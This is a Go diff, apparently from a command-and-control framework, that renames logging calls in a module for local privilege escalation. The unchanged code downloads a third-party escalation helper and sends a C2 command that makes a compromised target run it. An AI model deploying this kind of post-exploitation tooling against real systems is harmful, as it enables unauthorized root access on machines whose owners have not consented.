@@ -25,31 +25,31 @@ func moduleLPE() {
 		// target
 		target := CurrentTarget
 		if target == nil {
-			CliPrintError("Target not exist")
+			LogError("Target not exist")
 			return
 		}
 		helperOpt, ok := CurrentModuleOptions["lpe_helper"]
 		if !ok {
-			CliPrintError("Option 'lpe_helper' not found")
+			LogError("Option 'lpe_helper' not found")
 			return
 		}
 		helperName := helperOpt.Val
 
 		// download third-party LPE helper
-		CliPrintInfo("Updating local LPE helper...")
+		LogInfo("Updating local LPE helper...")
 		err := DownloadFile(LPEHelperURLs[helperName], Temp+tun.WWW+helperName)
 		if err != nil {
-			CliPrintError("Failed to download %s: %v", helperName, err)
+			LogError("Failed to download %s: %v", helperName, err)
 			return
 		}
 
 		// exec
-		CliMsg("This can take some time, please be patient")
+		LogMsg("This can take some time, please be patient")
 		cmd := fmt.Sprintf("%s --script_name %s", emp3r0r_def.C2CmdLPE, helperName)
-		CliPrintInfo("Running %s", cmd)
+		LogInfo("Running %s", cmd)
 		err = SendCmd(cmd, "", target)
 		if err != nil {
-			CliPrintError("Run %s: %v", cmd, err)
+			LogError("Run %s: %v", cmd, err)
 		}
 	}()
 }
